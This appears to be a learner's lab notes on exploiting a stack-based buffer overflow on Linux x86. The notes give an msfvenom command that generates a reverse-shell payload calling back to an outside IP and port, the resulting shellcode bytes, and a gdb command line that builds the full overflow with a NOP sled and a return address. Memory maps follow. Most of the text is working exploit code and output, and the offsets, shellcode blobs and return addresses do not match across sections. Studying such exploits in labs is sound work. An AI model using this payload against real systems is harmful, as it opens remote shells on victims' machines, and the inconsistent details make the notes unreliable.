[[Stack-Based Buffer Overflows on Linux x86]]
bad carateres \x00\x09\x0a\x20

#### MSFvenom Syntax
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```

#### MSFvenom - Generate Shellcode
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.76 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode


```

#### Shellcode

```shell-session
cat shellcode

unsigned char buf[] = 
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
<SNIP>
```

"\xba\x2c\xa8\x04\xfd\xd9\xcd\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x83\xed\xfc\x31\x55\x0e\x03\x79\xa6\xe6\x08\xb0\x6d\x11\x11\xe1\xd2\x8d\xbc\x07\x5c\xd0\xf1\x61\x93\x93\x61\x34\x9b\xab\x48\x46\x92\xaa\xab\x2e\x2f\x47\x42\xe2\x47\x55\x5a\x80\xfe\xd0\xbb\xc4\x67\xb3\x6a\x77\xdb\x30\x04\x96\xd6\xb7\x44\x30\x87\x98\x1b\xa8\x3f\xc8\xf4\x4a\xa9\x9f\xe8\xd8\x7a\x29\x0f\x6c\x77\xe4\x50"



#### Notes

```shell-session
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

#### Exploit with Shellcode
 ```shell-session
(gdb) run $(python -c 'print "\x55" * (2064 - 124 - 95 - 4) + "\x90" * 124 + "\xba\x2c\xa8\x04\xfd\xd9\xcd\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x83\xed\xfc\x31\x55\x0e\x03\x79\xa6\xe6\x08\xb0\x6d\x11\x11\xe1\xd2\x8d\xbc\x07\x5c\xd0\xf1\x61\x93\x93\x61\x34\x9b\xab\x48\x46\x92\xaa\xab\x2e\x2f\x47\x42\xe2\x47\x55\x5a\x80\xfe\xd0\xbb\xc4\x67\xb3\x6a\x77\xdb\x30\x04\x96\xd6\xb7\x44\x30\x87\x98\x1b\xa8\x3f\xc8\xf4\x4a\xa9\x9f\xe8\xd8\x7a\x29\x0f\x6c\x77\xe4\x50" + "\x2e\xd7\xff\xff"')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

Next, we check if the first bytes of our shellcode match the bytes after the NOPS.

#### The Stack
```shell-session
gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |----> Shellcode begins
<SNIP>
```

0xf7e729c8

#### Stack size:

stack size=0xffffe000 - 0xfffdd000 = 0x21000

```
(gdb) info proc all
process 2085
cmdline = '/home/htb-student/bow'
cwd = '/home/htb-student'
exe = '/home/htb-student/bow'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x56555000 0x56556000     0x1000        0x0 /home/htb-student/bow
        0x56556000 0x56557000     0x1000        0x0 /home/htb-student/bow
        0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/bow
        0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
        0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
        0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
        0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
        0xf7fc3000 0xf7fc6000     0x3000        0x0 
        0xf7fcf000 0xf7fd1000     0x2000        0x0 
        0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
        0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
        0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
        0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
        0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
Name:   bow
Umask:  0002
State:  t (tracing stop)
Tgid:   2085
Ngid:   0
Pid:    2085
PPid:   2083
TracerPid:      2083
Uid:    1001    1001    1001    1001
Gid:    1001    1001    1001    1001
FDSize: 64
Groups: 1001 
NStgid: 2085
NSpid:  2085

```
